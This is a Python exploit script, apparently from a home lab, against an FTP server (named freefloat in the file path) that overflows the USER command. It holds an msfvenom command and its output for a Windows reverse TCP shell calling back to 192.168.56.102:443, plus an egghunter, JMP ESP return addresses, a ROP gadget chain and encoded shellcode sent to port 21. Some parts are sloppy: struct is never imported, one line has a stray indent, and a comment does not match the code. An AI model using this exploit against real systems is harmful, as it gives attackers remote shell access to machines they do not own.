#!/usr/bin/python
import socket
# Create an array of buffers, from 1 to 5900, with increments of 200.


'''


root@kali:~/buffer_overflow/host_based/freefloat# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.102 LPORT=443 -b "\x00\x0a\x0b\x27\x36\xce\xc1\x04\x14\x3a\x44\xe0\x42\xa9\x0d" -f python
No platform was selected, choosing Msf::Module::Platform::Windows from the payload
No Arch selected, selecting Arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai failed with A valid opcode permutation could not be found.
Attempting to encode payload with 1 iterations of generic/none
generic/none failed with Encoding failed due to a bad character (index=3, char=0x00)
Attempting to encode payload with 1 iterations of x86/call4_dword_xor
x86/call4_dword_xor succeeded with size 348 (iteration=0)
x86/call4_dword_xor chosen with final size 348
Payload size: 348 bytes
Final size of python file: 1672 bytes

'''

egghunter = "\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x8b\xfa\xaf\x75\xea\xaf\x75\xe7\xff\xe7"

ret = "\xfb\x41\xbd\x7c" # JMP ESP at SHELL32.dll, 0x7cbd41fb", has SafeSEH
ret1 = '\xeb\x30\x9d\x7c' #this works too, also in SHELL32.dll

def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      0x00000000,  # [-] Unable to find API pointer -> eax
      0x7c902afc,  # MOV EAX,DWORD PTR DS:[EAX] # RETN 0x04 [ntdll.dll]
      0x7c94d192,  # XCHG EAX,ESI # RETN [ntdll.dll]
      0x41414141,  # Filler (RETN offset compensation)
      0x7c934c31,  # POP EBP # RETN [ntdll.dll]
      0x7c919db0,  # & push esp # ret  [ntdll.dll]
      0x7c902aa7,  # POP EBX # RETN [ntdll.dll]
      0x00000201,  # 0x00000201-> ebx
      0x7c90e2e6,  # POP EDX # RETN [ntdll.dll]
      0x00000040,  # 0x00000040-> edx
      0x7c972332,  # POP ECX # RETN [ntdll.dll]
      0x7c97c5f1,  # &Writable location [ntdll.dll]
      0x7c902570,  # POP EDI # RETN [ntdll.dll]
      0x7c902582,  # RETN (ROP NOP) [ntdll.dll]
      0x7c970f95,  # POP EAX # POP EBP # RETN [ntdll.dll]
      0x90909090,  # nop
      0x41414141,  # Filler (compensate)
      0x7c94d22b,  # PUSHAD # RETN [ntdll.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()

shell =  ""
shell += "\x29\xc9\x83\xe9\xaf\xe8\xff\xff\xff\xff\xc0\x5e\x81"
shell += "\x76\x0e\xa5\xbe\x8c\xf0\x83\xee\xfc\xe2\xf4\x59\x56"
shell += "\x0e\xf0\xa5\xbe\xec\x79\x40\x8f\x4c\x94\x2e\xee\xbc"
shell += "\x7b\xf7\xb2\x07\xa2\xb1\x35\xfe\xd8\xaa\x09\xc6\xd6"
shell += "\x94\x41\x20\xcc\xc4\xc2\x8e\xdc\x85\x7f\x43\xfd\xa4"
shell += "\x79\x6e\x02\xf7\xe9\x07\xa2\xb5\x35\xc6\xcc\x2e\xf2"
shell += "\x9d\x88\x46\xf6\x8d\x21\xf4\x35\xd5\xd0\xa4\x6d\x07"
shell += "\xb9\xbd\x5d\xb6\xb9\x2e\x8a\x07\xf1\x73\x8f\x73\x5c"
shell += "\x64\x71\x81\xf1\x62\x86\x6c\x85\x53\xbd\xf1\x08\x9e"
shell += "\xc3\xa8\x85\x41\xe6\x07\xa8\x81\xbf\x5f\x96\x2e\xb2"
shell += "\xc7\x7b\xfd\xa2\x8d\x23\x2e\xba\x07\xf1\x75\x37\xc8"
shell += "\xd4\x81\xe5\xd7\x91\xfc\xe4\xdd\x0f\x45\xe1\xd3\xaa"
shell += "\x2e\xac\x67\x7d\xf8\xd6\xbf\xc2\xa5\xbe\xe4\x87\xd6"
shell += "\x8c\xd3\xa4\xcd\xf2\xfb\xd6\xa2\x41\x59\x48\x35\xbf"
shell += "\x8c\xf0\x8c\x7a\xd8\xa0\xcd\x97\x0c\x9b\xa5\x41\x59"
shell += "\xa0\xf5\xee\xdc\xb0\xf5\xfe\xdc\x98\x4f\xb1\x53\x10"
shell += "\x5a\x6b\x1b\x9a\xa0\xd6\x4c\x58\x9d\xd8\xe4\xf2\xa5"
shell += "\xbf\x37\x79\x43\xd4\x9c\xa6\xf2\xd6\x15\x55\xd1\xdf"
shell += "\x73\x25\x20\x7e\xf8\xfc\x5a\xf0\x84\x85\x49\xd6\x7c"
shell += "\x45\x07\xe8\x73\x25\xcd\xdd\xe1\x94\xa5\x37\x6f\xa7"
shell += "\xf2\xe9\xbd\x06\xcf\xac\xd5\xa6\x47\x43\xea\x37\xe1"
shell += "\x9a\xb0\xf1\xa4\x33\xc8\xd4\xb5\x78\x8c\xb4\xf1\xee"
shell += "\xda\xa6\xf3\xf8\xda\xbe\xf3\xe8\xdf\xa6\xcd\xc7\x40"
shell += "\xcf\x23\x41\x59\x79\x45\xf0\xda\xb6\x5a\x8e\xe4\xf8"
shell += "\x22\xa3\xec\x0f\x70\x05\x7c\x45\x07\xe8\xe4\x56\x30"
shell += "\x03\x11\x0f\x70\x82\x8a\x8c\xaf\x3e\x77\x10\xd0\xbb"
shell += "\x37\xb7\xb6\xcc\xe3\x9a\xa5\xed\x73\x25"
# junk size: 230 - 4 - egghunter size (32)
buf = (("A" * 194) + egghunter  + ('\x90' * 4) + ret + 'w00tw00t' + shell)
print "Fuzzing USER with %s bytes" % len(buf)
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect=s.connect(('192.168.56.101',21))
payload = 'USER ' + buf + " \r\n\r\n"
s.recv(1024)
s.send(payload)
s.close()
